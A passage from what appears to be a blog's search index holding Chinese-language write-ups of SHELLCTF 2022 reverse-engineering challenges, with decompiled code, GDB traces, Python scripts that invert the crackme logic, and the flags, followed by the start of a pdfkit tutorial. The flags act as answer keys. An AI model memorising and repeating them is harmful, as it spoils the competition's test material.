\u9898\u76ee"},{"location":"CTF/SHELLCTF2022_World%27s_greatest_detective/#2","text":"https://new.qq.com/rain/a/20200702A0NQ2O00?pc flag: SHELLCTF{W?kandC_F?rev?r}","title":"2 \u89e3\u9898"},{"location":"CTF/SHELLCTF2022_World%27s_greatest_detective/#3","text":"BAK: https://img.vjob.top/imgs/Wakandan.jpg","title":"\uff13\u3000\u74e6\u5e72\u8fbe\u6587\u5b57/\u74e6\u5e72\u9054\u6587\u5b57"},{"location":"CTF/SHELLCTF2022_World%27s_greatest_detective/#4-shellctfw4kanda_f0rev3r","text":"","title":"\uff14\u3000SHELLCTF{W4kandA_F0rev3r}"},{"location":"CTF/SHELLCTF2022_swift/","text":"1 \u9898\u76ee\uff1a $ ./swift alright here you go: wbppcugz { F4zp0i5_w3l1p5_sW_4_xHhO7j0r } wait, do you not want to know the key? \u539f\u9898\u89c1 https://github.com/S-H-E-L-L/S.H.E.L.L-CTF-2022/tree/main/rev/swift #include <stdio.h> // shellctf{T4yl0r5_s3r1e5_oF_4_fUnC7i0n} double func ( int x ) { double sum = 1 , oldsum = 0 , term = 1 ; int i = 1 ; while ( sum != oldsum ) { oldsum = sum ; term *= ( double ) x / i ; sum += term ; i ++ ; } return sum ; } void encrypt ( char key [ 13 ]) // EULERSNUMBER { double vals [ 12 ]; //int offset[12] = {-2, -1, 1, 2, -3, 0, 5, -1, -1, 1, 3, 5} char offset [ 12 ] = \"GVKCUSIVNABM\" ; for ( int i = 0 ; i < 12 ; i ++ ) { vals [ i ] = func ( key [ i ] - offset [ i ]); printf ( \"%f \" , vals [ i ]); } printf ( \" \\n \" ); } int main () { char flag [ 39 ] = \"wbppcugz{F4zp0i5_w3l1p5_sW_4_xHhO7j0r}\" ; printf ( \"%s \\n %s \\n %s \\n \" , \"alright here you go: \" , flag , \"wait, do you not want to know the key?\" ); encrypt ( \"EULERSNUMBER\" ); } 2 \u8c03\u8bd5\uff1a GDB\u8c03\u8bd5\u76f4\u63a5\u8c03\u7528 encrypt \u51fd\u6570\uff1a gef\u27a4 p ( size_t ) encrypt ( \"abcdefghij\" ) 195729609428 .838745 162754 .791419 26489122129 .843460 214643579785916 .031250 8886110 .520508 178482300 .963187 10686474581524 .464844 65659969 .137331 532048240601 .799072 639843493530054656 .000000 -10496412488.786388 -24318586602600160.00000 \u6784\u9020\u4e0e v4 = GVKCUSIVNABM \u5dee\u4e3a -11 ~ 0, 0 ~ 11\u7684\u7ed3\u679c: v4 = \"GVKCUSIVNABM\" r = [] q = [] cnt = 0 for x in v4 : r . append ( chr ( ord ( x ) + cnt )) q . append ( chr ( ord ( x ) - cnt )) cnt = cnt + 1 print ( \"\" . join ( r )) print ( \"\" . join ( q )) \u83b7\u5f97\u7ed3\u679c GWMFYXO]VJLX \u548c GUI@QNCOF88B , GWMFYXO ] VJLX gef\u27a4 p ( size_t ) encrypt ( \"GWMFYXO]VJLX\" ) 1 .000000 2 .718282 7 .389056 20 .085537 54 .598150 148 .413159 403 .428793 1096 .633158 2980 .957987 8103 .083928 22026 .465795 59874 .141715 GUI@QNCOF88B gef\u27a4 p ( size_t ) encrypt ( \"GUI@QNCOF88B\" ) 1 .000000 0 .367879 0 .135335 0 .049787 0 .018316 0 .006738 0 .002479 0 .000912 0 .000335 0 .000123 0 .000045 0 .000017 \u4eceout.txt\u4e2d\u7684\u8f93\u51fa\uff0c\u6574\u7406\u51fa\u5dee\u503c\uff1a c=[0.135335,0.367879,2.718282,7.389056,0.049787,1.000000,148.413159,0.367879,0.367879,2.718282,20.085537,148.413159] \u8c03\u7528\u7684\u662f\uff1afun([-2, -1, 1, 2, -3, 0, 5, -1, -1, 1, 3, 5]) r = [] v4 = b \"GVKCUSIVNABM\" i = 0 for x in [ - 2 , - 1 , 1 , 2 , - 3 , 0 , 5 , - 1 , - 1 , 1 , 3 , 5 ]: r . append ( v4 [ i ] + x ) i = i + 1 print ( bytes ( r )) \u8f93\u51fa EULERSNUMBER ,\u5728gdb\u4e2d\u9a8c\u8bc1\uff1a gef\u27a4 p ( size_t ) encrypt ( \"EULERSNUMBER\" ) 0 .135335 0 .367879 2 .718282 7 .389056 0 .049787 1 .000000 148 .413159 0 .367879 0 .367879 2 .718282 20 .085537 148 .413159 3 flag \u89e3\u5bc6 wbppcugz{F4zp0i5_w3l1p5_sW_4_xHhO7j0r} : onsite https://planetcalc.com/2468/ , KEY : EULERSNUMBER make Transformed text shellctf{t4yl0r5_s3r1e5_of_4_func7i0n}, which is not correct flag Site : https://www.dcode.fr/vigenere-cipher shellctf{T4yl0r5_s3r1e5_oF_4_fUnC7i0n}","title":"SHELLCTF2022 swift"},{"location":"CTF/SHELLCTF2022_swift/#1","text":"$ ./swift alright here you go: wbppcugz { F4zp0i5_w3l1p5_sW_4_xHhO7j0r } wait, do you not want to know the key? \u539f\u9898\u89c1 https://github.com/S-H-E-L-L/S.H.E.L.L-CTF-2022/tree/main/rev/swift #include <stdio.h> // shellctf{T4yl0r5_s3r1e5_oF_4_fUnC7i0n} double func ( int x ) { double sum = 1 , oldsum = 0 , term = 1 ; int i = 1 ; while ( sum != oldsum ) { oldsum = sum ; term *= ( double ) x / i ; sum += term ; i ++ ; } return sum ; } void encrypt ( char key [ 13 ]) // EULERSNUMBER { double vals [ 12 ]; //int offset[12] = {-2, -1, 1, 2, -3, 0, 5, -1, -1, 1, 3, 5} char offset [ 12 ] = \"GVKCUSIVNABM\" ; for ( int i = 0 ; i < 12 ; i ++ ) { vals [ i ] = func ( key [ i ] - offset [ i ]); printf ( \"%f \" , vals [ i ]); } printf ( \" \\n \" ); } int main () { char flag [ 39 ] = \"wbppcugz{F4zp0i5_w3l1p5_sW_4_xHhO7j0r}\" ; printf ( \"%s \\n %s \\n %s \\n \" , \"alright here you go: \" , flag , \"wait, do you not want to know the key?\" ); encrypt ( \"EULERSNUMBER\" ); }","title":"1 \u9898\u76ee\uff1a"},{"location":"CTF/SHELLCTF2022_swift/#2","text":"GDB\u8c03\u8bd5\u76f4\u63a5\u8c03\u7528 encrypt \u51fd\u6570\uff1a gef\u27a4 p ( size_t ) encrypt ( \"abcdefghij\" ) 195729609428 .838745 162754 .791419 26489122129 .843460 214643579785916 .031250 8886110 .520508 178482300 .963187 10686474581524 .464844 65659969 .137331 532048240601 .799072 639843493530054656 .000000 -10496412488.786388 -24318586602600160.00000 \u6784\u9020\u4e0e v4 = GVKCUSIVNABM \u5dee\u4e3a -11 ~ 0, 0 ~ 11\u7684\u7ed3\u679c: v4 = \"GVKCUSIVNABM\" r = [] q = [] cnt = 0 for x in v4 : r . append ( chr ( ord ( x ) + cnt )) q . append ( chr ( ord ( x ) - cnt )) cnt = cnt + 1 print ( \"\" . join ( r )) print ( \"\" . join ( q )) \u83b7\u5f97\u7ed3\u679c GWMFYXO]VJLX \u548c GUI@QNCOF88B , GWMFYXO ] VJLX gef\u27a4 p ( size_t ) encrypt ( \"GWMFYXO]VJLX\" ) 1 .000000 2 .718282 7 .389056 20 .085537 54 .598150 148 .413159 403 .428793 1096 .633158 2980 .957987 8103 .083928 22026 .465795 59874 .141715 GUI@QNCOF88B gef\u27a4 p ( size_t ) encrypt ( \"GUI@QNCOF88B\" ) 1 .000000 0 .367879 0 .135335 0 .049787 0 .018316 0 .006738 0 .002479 0 .000912 0 .000335 0 .000123 0 .000045 0 .000017 \u4eceout.txt\u4e2d\u7684\u8f93\u51fa\uff0c\u6574\u7406\u51fa\u5dee\u503c\uff1a c=[0.135335,0.367879,2.718282,7.389056,0.049787,1.000000,148.413159,0.367879,0.367879,2.718282,20.085537,148.413159] \u8c03\u7528\u7684\u662f\uff1afun([-2, -1, 1, 2, -3, 0, 5, -1, -1, 1, 3, 5]) r = [] v4 = b \"GVKCUSIVNABM\" i = 0 for x in [ - 2 , - 1 , 1 , 2 , - 3 , 0 , 5 , - 1 , - 1 , 1 , 3 , 5 ]: r . append ( v4 [ i ] + x ) i = i + 1 print ( bytes ( r )) \u8f93\u51fa EULERSNUMBER ,\u5728gdb\u4e2d\u9a8c\u8bc1\uff1a gef\u27a4 p ( size_t ) encrypt ( \"EULERSNUMBER\" ) 0 .135335 0 .367879 2 .718282 7 .389056 0 .049787 1 .000000 148 .413159 0 .367879 0 .367879 2 .718282 20 .085537 148 .413159","title":"2 \u8c03\u8bd5\uff1a"},{"location":"CTF/SHELLCTF2022_swift/#3-flag","text":"\u89e3\u5bc6 wbppcugz{F4zp0i5_w3l1p5_sW_4_xHhO7j0r} : onsite https://planetcalc.com/2468/ , KEY : EULERSNUMBER make Transformed text shellctf{t4yl0r5_s3r1e5_of_4_func7i0n}, which is not correct flag Site : https://www.dcode.fr/vigenere-cipher shellctf{T4yl0r5_s3r1e5_oF_4_fUnC7i0n}","title":"3 flag"},{"location":"CTF/SHELLCTF2022_tea/","text":"1 IDA64 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { boilWater (); if ( strlen ( pwd ) == 32 ) { addSugar (); addTea (); addMilk (); strainAndServe (); } else { puts ( \"wrong length\" ); } return 0 ; } __int64 boilWater () { printf ( \"Enter the flag: \" ); return __isoc99_scanf ( \"%s\" , pwd ); } unsigned __int64 addSugar () { int i ; // [rsp+4h] [rbp-5Ch] char v2 [ 8 ]; // [rsp+10h] [rbp-50h] BYREF __int64 v3 ; // [rsp+18h] [rbp-48h] char v4 ; // [rsp+20h] [rbp-40h] char dest [ 8 ]; // [rsp+30h] [rbp-30h] BYREF __int64 v6 ; // [rsp+38h] [rbp-28h] char v7 ; // [rsp+40h] [rbp-20h] unsigned __int64 v8 ; // [rsp+48h] [rbp-18h] v8 = __readfsqword ( 0x28u ); * ( _QWORD * ) v2 = 0L L ; v3 = 0L L ; v4 = 0 ; * ( _QWORD * ) dest = 0L L ; v6 = 0L L ; v7 = 0 ; for ( i = 0 ; i < strlen ( pwd ); ++ i ) { if ( ( i & 1 ) != 0 ) strncat ( v2 , & pwd [ i ], 1uLL ); else strncat ( dest , & pwd [ i ], 1uLL ); } strncat ( v2 , dest , 0x11uLL ); strcpy ( pwd , v2 ); return __readfsqword ( 0x28u ) ^ v8 ; } unsigned __int64 addTea () { size_t v0 ; // rbx size_t v1 ; // rbx char src ; // [rsp+7h] [rbp-49h] BYREF int i ; // [rsp+8h] [rbp-48h] int j ; // [rsp+Ch] [rbp-44h] char dest [ 8 ]; // [rsp+10h] [rbp-40h] BYREF __int64 v7 ; // [rsp+18h] [rbp-38h] __int64 v8 ; // [rsp+20h] [rbp-30h] __int64 v9 ; // [rsp+28h] [rbp-28h] char v10 ; // [rsp+30h] [rbp-20h] unsigned __int64 v11 ; // [rsp+38h] [rbp-18h] v11 = __readfsqword ( 0x28u ); * ( _QWORD * ) dest = 0L L ; v7 = 0L L ; v8 = 0L L ; v9 = 0L L ; v10 = 0 ; for ( i = 0 ; ; ++ i ) { v0 = i ; if ( v0 >= strlen ( pwd ) >> 1 ) break ; src = pwd [ i ] + 3 * ( i / -2 ); strncat ( dest , & src , 1uLL ); } for ( j = strlen ( pwd ) >> 1 ; ; ++ j ) { v1 = j ; if ( v1 >= strlen ( pwd ) ) break ; src = pwd [ j ] + j / 6 ; strncat ( dest , & src , 1uLL ); } strcpy ( pwd , dest ); return __readfsqword ( 0x28u ) ^ v11 ; } unsigned __int64 addMilk () { size_t v0 ; // rax size_t v1 ; // rax int v3 ; // [rsp+4h] [rbp-ACh] char dest [ 8 ]; // [rsp+10h] [rbp-A0h] BYREF __int64 v5 ; // [rsp+18h] [rbp-98h] __int64 v6 ; // [rsp+20h] [rbp-90h] __int64 v7 ; // [rsp+28h] [rbp-88h] char v8 ; // [rsp+30h] [rbp-80h] char s [ 8 ]; // [rsp+40h] [rbp-70h] BYREF __int64 v10 ; // [rsp+48h] [rbp-68h] __int64 v11 ; // [rsp+50h] [rbp-60h] __int64 v12 ; // [rsp+58h] [rbp-58h] char v13 ; // [rsp+60h] [rbp-50h] char v14 [ 8 ]; // [rsp+70h] [rbp-40h] BYREF __int64 v15 ; // [rsp+78h] [rbp-38h] __int64 v16 ; // [rsp+80h] [rbp-30h] __int64 v17 ; // [rsp+88h] [rbp-28h] char v18 ; // [rsp+90h] [rbp-20h] unsigned __int64 v19 ; // [rsp+98h] [rbp-18h] v19 = __readfsqword ( 0x28u ); v3 = 0 ; * ( _QWORD * ) dest = 0L L ; v5 = 0L L ; v6 = 0L L ; v7 = 0L L ; v8 = 0 ; * ( _QWORD * ) s = 0L L ; v10 = 0L L ; v11 = 0L L ; v12 = 0L L ; v13 = 0 ; * ( _QWORD * ) v14 = 0L L ; v15 = 0L L ; v16 = 0L L ; v17 = 0L L ; v18 = 0 ; while ( pwd [ v3 ] != '5' && v3 < strlen ( pwd ) ) strncat ( dest , & pwd [ v3 ++ ], 1uLL ); while ( pwd [ v3 ] != 'R' && v3 < strlen ( pwd ) ) strncat ( s , & pwd [ v3 ++ ], 1uLL ); while ( v3 < strlen ( pwd ) ) strncat ( v14 , & pwd [ v3 ++ ], 1uLL ); v0 = strlen ( dest ); strncat ( v14 , dest , v0 ); v1 = strlen ( s ); strncat ( v14 , s , v1 ); strcpy ( pwd , v14 ); return __readfsqword ( 0x28u ) ^ v19 ; } int strainAndServe () { if ( ! strcmp ( \"R;crc75ihl`cNYe`]m%50gYhugow~34i\" , pwd ) ) return puts ( \"yep, that's right\" ); else return puts ( \"nope, that's not it\" ); } \uff12 gdb\u8c03\u8bd5 gdb\u8c03\u8bd5\uff0c\u8f93\u516532\u4f4d\u5355\u8bcd abcdefghijklmnopqrstuvwxyz012345 \uff0c\u6709\u5982\u4e0b\u8f93\u51fa\uff1a # addSugar\u3000\uff1a\u3000$rdi : 0x0000555555558040 \u2192 \"bdfhjlnprtvxz135acegikmoqsuwy024\" # addTea : 0x555555558040 <pwd>: \"bdcedfegfhgih\\037\\036 cehjlnpruwy{}479\" # addMilk 0x555555558040 <pwd>: \"bdcedfegfhgih\\037\\036 cehjlnpruwy{}479\" gdb\u8c03\u8bd5\uff0c\u8f93\u516532\u4f4d\u5355\u8bcd shellctf{abcdefghijklmnopqrstuv} \uff0c\u6709\u5982\u4e0b\u8f93\u51fa\uff1a # addSugar 0x555555558040 <pwd>: \"hlcfacegikmoqsu}selt{bdfhjlnprtv\" # addTea : 0x555555558040 <pwd>: \"hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{\" # addMilk 0x555555558040 <pwd>: \"hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{\" r = b 'abcdefghijklmnopqrstuvwxyz012345' left = [] right = [] for i in range ( len ( r )): if ( i & 1 != 0 ): right . append ( r [ i ]) else : left . append ( r [ i ]) cx = bytes ( right ) + bytes ( left ) half = len ( cx ) // 2 r = [] for i in range ( 0 , half ): r . append ( cx [ i ] - 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] + i // 6 ) bytes ( r ) # b'bacbdcedfegfh\\x1c\\x1e\\x1dehjlnpruwy{}479' 3\u3000\u9006\u5411 cx = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' #cx = b'hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{' half = len ( cx ) // 2 r = [] for i in range ( 0 , half ): r . append ( cx [ i ] + 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] - i // 6 ) left = r [: half ] right = r [ half : len ( cx )] flag = [] for i in range ( half ): flag . append ( right [ i ]) flag . append ( left [ i ]) print ( bytes ( flag )) 4 addMilk \u4ece\u9006\u5411\u4ee3\u7801\u770b\uff1aaddMilk\u51fd\u6570\u5bf9pwd\u8fdb\u884c\u62fc\u63a5\uff1a - \u5f00\u59cb\u5230\u5b57\u7b26\uff15\u5b58\u5165dest - \u5f53\u524d\u4f4d\u7f6e\u5230\u5b57\u7b26\uff32\u5b58\u5165s - \u5176\u5b83\u5b57\u7b26\u5b58\u5165v14 - v14\u62fc\u63a5dest\u548cs\u62f7\u8d1d\u5230pwd gdb\u8bbe\u7f6epwd\u5305\u542b5\u548cR: set { char [ 32 ]} 0x0000555555558040 = \"012345ABCDERabcdefghjkloiuytrewq\" gef\u27a4 ni gef\u27a4 x/s 0x0000555555558040 0x555555558040 <pwd>: \"Rabcdefghjkloiuytrewq012345ABCDE\" set { char [ 32 ]} 0x0000555555558040 = \"01234567ABCDEabcdeRfghjkloiuytrewq\" gef\u27a4 ni gef\u27a4 x/s 0x0000555555558040 0x555555558040 <pwd>: \"Rfghjkloiuytrewq01234567ABCDEabcde\" \u53ef\u4ee5\u770b\u5230\uff0caddMilk\u5bf9pwd\u5728\uff32\u5904\u5207\u65ad\uff0c\u8c03\u6362\u524d\u540e\u987a\u5e8f\u540e\u62fc\u63a5,\u6240\u6709\u670932\u79cd\u7206\u7834\u53ef\u80fd\uff1a \u9006\u5411addMilk cx = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' for i in range ( 1 , 30 ): ct = cx [ i : 32 ] + cx [ 0 : i ] print ( ct ) 5 exp: ct = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' half = 16 for i in range ( 1 , 30 ): cx = ct [ i : 32 ] + ct [ 0 : i ] r = [] for i in range ( 0 , half ): r . append ( cx [ i ] + 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] - i // 6 ) left = r [: half ] right = r [ half : len ( cx )] flag = [] for i in range ( half ): flag . append ( right [ i ]) flag . append ( left [ i ]) print ( bytes ( flag )) shellctf{T0_1nfiNi7y_4nD_B3y0nd}","title":"SHELLCTF2022 tea"},{"location":"CTF/SHELLCTF2022_tea/#1-ida64","text":"int __cdecl main ( int argc , const char ** argv , const char ** envp ) { boilWater (); if ( strlen ( pwd ) == 32 ) { addSugar (); addTea (); addMilk (); strainAndServe (); } else { puts ( \"wrong length\" ); } return 0 ; } __int64 boilWater () { printf ( \"Enter the flag: \" ); return __isoc99_scanf ( \"%s\" , pwd ); } unsigned __int64 addSugar () { int i ; // [rsp+4h] [rbp-5Ch] char v2 [ 8 ]; // [rsp+10h] [rbp-50h] BYREF __int64 v3 ; // [rsp+18h] [rbp-48h] char v4 ; // [rsp+20h] [rbp-40h] char dest [ 8 ]; // [rsp+30h] [rbp-30h] BYREF __int64 v6 ; // [rsp+38h] [rbp-28h] char v7 ; // [rsp+40h] [rbp-20h] unsigned __int64 v8 ; // [rsp+48h] [rbp-18h] v8 = __readfsqword ( 0x28u ); * ( _QWORD * ) v2 = 0L L ; v3 = 0L L ; v4 = 0 ; * ( _QWORD * ) dest = 0L L ; v6 = 0L L ; v7 = 0 ; for ( i = 0 ; i < strlen ( pwd ); ++ i ) { if ( ( i & 1 ) != 0 ) strncat ( v2 , & pwd [ i ], 1uLL ); else strncat ( dest , & pwd [ i ], 1uLL ); } strncat ( v2 , dest , 0x11uLL ); strcpy ( pwd , v2 ); return __readfsqword ( 0x28u ) ^ v8 ; } unsigned __int64 addTea () { size_t v0 ; // rbx size_t v1 ; // rbx char src ; // [rsp+7h] [rbp-49h] BYREF int i ; // [rsp+8h] [rbp-48h] int j ; // [rsp+Ch] [rbp-44h] char dest [ 8 ]; // [rsp+10h] [rbp-40h] BYREF __int64 v7 ; // [rsp+18h] [rbp-38h] __int64 v8 ; // [rsp+20h] [rbp-30h] __int64 v9 ; // [rsp+28h] [rbp-28h] char v10 ; // [rsp+30h] [rbp-20h] unsigned __int64 v11 ; // [rsp+38h] [rbp-18h] v11 = __readfsqword ( 0x28u ); * ( _QWORD * ) dest = 0L L ; v7 = 0L L ; v8 = 0L L ; v9 = 0L L ; v10 = 0 ; for ( i = 0 ; ; ++ i ) { v0 = i ; if ( v0 >= strlen ( pwd ) >> 1 ) break ; src = pwd [ i ] + 3 * ( i / -2 ); strncat ( dest , & src , 1uLL ); } for ( j = strlen ( pwd ) >> 1 ; ; ++ j ) { v1 = j ; if ( v1 >= strlen ( pwd ) ) break ; src = pwd [ j ] + j / 6 ; strncat ( dest , & src , 1uLL ); } strcpy ( pwd , dest ); return __readfsqword ( 0x28u ) ^ v11 ; } unsigned __int64 addMilk () { size_t v0 ; // rax size_t v1 ; // rax int v3 ; // [rsp+4h] [rbp-ACh] char dest [ 8 ]; // [rsp+10h] [rbp-A0h] BYREF __int64 v5 ; // [rsp+18h] [rbp-98h] __int64 v6 ; // [rsp+20h] [rbp-90h] __int64 v7 ; // [rsp+28h] [rbp-88h] char v8 ; // [rsp+30h] [rbp-80h] char s [ 8 ]; // [rsp+40h] [rbp-70h] BYREF __int64 v10 ; // [rsp+48h] [rbp-68h] __int64 v11 ; // [rsp+50h] [rbp-60h] __int64 v12 ; // [rsp+58h] [rbp-58h] char v13 ; // [rsp+60h] [rbp-50h] char v14 [ 8 ]; // [rsp+70h] [rbp-40h] BYREF __int64 v15 ; // [rsp+78h] [rbp-38h] __int64 v16 ; // [rsp+80h] [rbp-30h] __int64 v17 ; // [rsp+88h] [rbp-28h] char v18 ; // [rsp+90h] [rbp-20h] unsigned __int64 v19 ; // [rsp+98h] [rbp-18h] v19 = __readfsqword ( 0x28u ); v3 = 0 ; * ( _QWORD * ) dest = 0L L ; v5 = 0L L ; v6 = 0L L ; v7 = 0L L ; v8 = 0 ; * ( _QWORD * ) s = 0L L ; v10 = 0L L ; v11 = 0L L ; v12 = 0L L ; v13 = 0 ; * ( _QWORD * ) v14 = 0L L ; v15 = 0L L ; v16 = 0L L ; v17 = 0L L ; v18 = 0 ; while ( pwd [ v3 ] != '5' && v3 < strlen ( pwd ) ) strncat ( dest , & pwd [ v3 ++ ], 1uLL ); while ( pwd [ v3 ] != 'R' && v3 < strlen ( pwd ) ) strncat ( s , & pwd [ v3 ++ ], 1uLL ); while ( v3 < strlen ( pwd ) ) strncat ( v14 , & pwd [ v3 ++ ], 1uLL ); v0 = strlen ( dest ); strncat ( v14 , dest , v0 ); v1 = strlen ( s ); strncat ( v14 , s , v1 ); strcpy ( pwd , v14 ); return __readfsqword ( 0x28u ) ^ v19 ; } int strainAndServe () { if ( ! strcmp ( \"R;crc75ihl`cNYe`]m%50gYhugow~34i\" , pwd ) ) return puts ( \"yep, that's right\" ); else return puts ( \"nope, that's not it\" ); }","title":"1 IDA64"},{"location":"CTF/SHELLCTF2022_tea/#2-gdb","text":"gdb\u8c03\u8bd5\uff0c\u8f93\u516532\u4f4d\u5355\u8bcd abcdefghijklmnopqrstuvwxyz012345 \uff0c\u6709\u5982\u4e0b\u8f93\u51fa\uff1a # addSugar\u3000\uff1a\u3000$rdi : 0x0000555555558040 \u2192 \"bdfhjlnprtvxz135acegikmoqsuwy024\" # addTea : 0x555555558040 <pwd>: \"bdcedfegfhgih\\037\\036 cehjlnpruwy{}479\" # addMilk 0x555555558040 <pwd>: \"bdcedfegfhgih\\037\\036 cehjlnpruwy{}479\" gdb\u8c03\u8bd5\uff0c\u8f93\u516532\u4f4d\u5355\u8bcd shellctf{abcdefghijklmnopqrstuv} \uff0c\u6709\u5982\u4e0b\u8f93\u51fa\uff1a # addSugar 0x555555558040 <pwd>: \"hlcfacegikmoqsu}selt{bdfhjlnprtv\" # addTea : 0x555555558040 <pwd>: \"hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{\" # addMilk 0x555555558040 <pwd>: \"hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{\" r = b 'abcdefghijklmnopqrstuvwxyz012345' left = [] right = [] for i in range ( len ( r )): if ( i & 1 != 0 ): right . append ( r [ i ]) else : left . append ( r [ i ]) cx = bytes ( right ) + bytes ( left ) half = len ( cx ) // 2 r = [] for i in range ( 0 , half ): r . append ( cx [ i ] - 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] + i // 6 ) bytes ( r ) # b'bacbdcedfegfh\\x1c\\x1e\\x1dehjlnpruwy{}479'","title":"\uff12 gdb\u8c03\u8bd5"},{"location":"CTF/SHELLCTF2022_tea/#3","text":"cx = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' #cx = b'hl`c[]\\\\^]_^`_a`hugow~egilnprtvy{' half = len ( cx ) // 2 r = [] for i in range ( 0 , half ): r . append ( cx [ i ] + 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] - i // 6 ) left = r [: half ] right = r [ half : len ( cx )] flag = [] for i in range ( half ): flag . append ( right [ i ]) flag . append ( left [ i ]) print ( bytes ( flag ))","title":"3\u3000\u9006\u5411"},{"location":"CTF/SHELLCTF2022_tea/#4-addmilk","text":"\u4ece\u9006\u5411\u4ee3\u7801\u770b\uff1aaddMilk\u51fd\u6570\u5bf9pwd\u8fdb\u884c\u62fc\u63a5\uff1a - \u5f00\u59cb\u5230\u5b57\u7b26\uff15\u5b58\u5165dest - \u5f53\u524d\u4f4d\u7f6e\u5230\u5b57\u7b26\uff32\u5b58\u5165s - \u5176\u5b83\u5b57\u7b26\u5b58\u5165v14 - v14\u62fc\u63a5dest\u548cs\u62f7\u8d1d\u5230pwd gdb\u8bbe\u7f6epwd\u5305\u542b5\u548cR: set { char [ 32 ]} 0x0000555555558040 = \"012345ABCDERabcdefghjkloiuytrewq\" gef\u27a4 ni gef\u27a4 x/s 0x0000555555558040 0x555555558040 <pwd>: \"Rabcdefghjkloiuytrewq012345ABCDE\" set { char [ 32 ]} 0x0000555555558040 = \"01234567ABCDEabcdeRfghjkloiuytrewq\" gef\u27a4 ni gef\u27a4 x/s 0x0000555555558040 0x555555558040 <pwd>: \"Rfghjkloiuytrewq01234567ABCDEabcde\" \u53ef\u4ee5\u770b\u5230\uff0caddMilk\u5bf9pwd\u5728\uff32\u5904\u5207\u65ad\uff0c\u8c03\u6362\u524d\u540e\u987a\u5e8f\u540e\u62fc\u63a5,\u6240\u6709\u670932\u79cd\u7206\u7834\u53ef\u80fd\uff1a \u9006\u5411addMilk cx = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' for i in range ( 1 , 30 ): ct = cx [ i : 32 ] + cx [ 0 : i ] print ( ct )","title":"4 addMilk"},{"location":"CTF/SHELLCTF2022_tea/#5-exp","text":"ct = b 'R;crc75ihl`cNYe`]m %50g Yhugow~34i' half = 16 for i in range ( 1 , 30 ): cx = ct [ i : 32 ] + ct [ 0 : i ] r = [] for i in range ( 0 , half ): r . append ( cx [ i ] + 3 * ( i // 2 )) for i in range ( half , len ( cx )): r . append ( cx [ i ] - i // 6 ) left = r [: half ] right = r [ half : len ( cx )] flag = [] for i in range ( half ): flag . append ( right [ i ]) flag . append ( left [ i ]) print ( bytes ( flag )) shellctf{T0_1nfiNi7y_4nD_B3y0nd}","title":"5 exp:"},{"location":"Python/python%E5%88%B6%E4%BD%9Cpdf%E7%94%B5%E5%AD%90%E4%B9%A6/","text":"python\u5236\u4f5cpdf\u7535\u5b50\u4e66 \u51c6\u5907 \u5236\u4f5c\u7535\u5b50\u4e66\u4f7f\u7528\u7684\u662f python \u7684 pdfkit \u8fd9\u4e2a\u5e93\uff0c pdfkit \u662f wkhtmltopdf \u7684 Python \u5c01\u88c5\u5305\uff0c\u56e0\u6b64\u5728\u5b89\u88c5\u8fd9\u4e2a\u4e4b\u524d\u8981\u5b89\u88c5 wkhtmltopdf \u5b89\u88c5wkhtmltopdf sudo apt-get install wkhtmltopdf ( ubantu \u4e0b\uff0c\u4e0d\u8fc7\u8fd9\u91cc\u5b89\u88c5\u7684\u65f6\u5019\u53ef\u80fd\u5bf9\u5e94\u7684\u7248\u672c\u4e0d\u540c\uff0c\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u5982\u679c\u4e0d\u884c\u7684\u8bdd\u8fd8\u8bf7\u81ea\u5df1\u767e\u5ea6\u4e0b\uff0c\u6211\u5b89\u88c5\u7684\u65f6\u5019\u662f\u53ef\u4ee5\u7684) windows \u4e0b\u7684\u7528\u6237\u76f4\u63a5\u5230 wkhtmltopdf \u5b98\u7f51\u4e0b\u8f7d\u7a33\u5b9a\u7248\u672c\uff0c\u7136\u540e\u76f4\u63a5\u5b89\u88c5\u5373\u53ef\uff0c\u4f46\u662f\u5b89\u88c5\u4e4b\u540e\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e00\u5b9a\u8981\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u627e\u4e0d\u5230\u8def\u5f84\u7684\u95ee\u9898 python\u5b89\u88c5\u4f9d\u8d56\u5305 \u4ee5\u4e0b\u90fd\u662f\u6211\u4eec\u9700\u8981\u7528\u5230\u7684\u5e93 pip install requests pip install BeautifulSoup4 pip install pdfkit pdfkit\u7684\u7528\u6cd5 \u521d\u7ea7\u4e86\u89e3\u51fd\u6570 pdfkit.from_url([url,],'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u4f20\u5165\u4e00\u4e2a url \u6216\u8005\u4e00\u4e2a url \u5217\u8868\uff0c\u7136\u540e\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u5c06\u5176\u7f51\u9875\u8f6c\u6362\u6210 demo.pdf ,\u6ce8\u610f\u8fd9\u91cc\u53ea\u80fd\u8f6c\u6362\u9759\u6001\u6587\u672c\uff0c\u5982\u679c\u4f7f\u7528js\u4e00\u4e9b\u811a\u672c\u7684\u8bdd\u662f\u4e0d\u80fd\u76f4\u63a5\u8f6c\u6362\u7684 pdfkit.from_string(\"<h1><a href=\"https://chenjiabing666.gituhb.io\">\u9648\u52a0\u5175\u7684\u535a\u5ba2</a></h1>\",'demo.pdf') \u8fd9\u4e2a\u662f\u76f4\u63a5\u8bb2\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 pdf 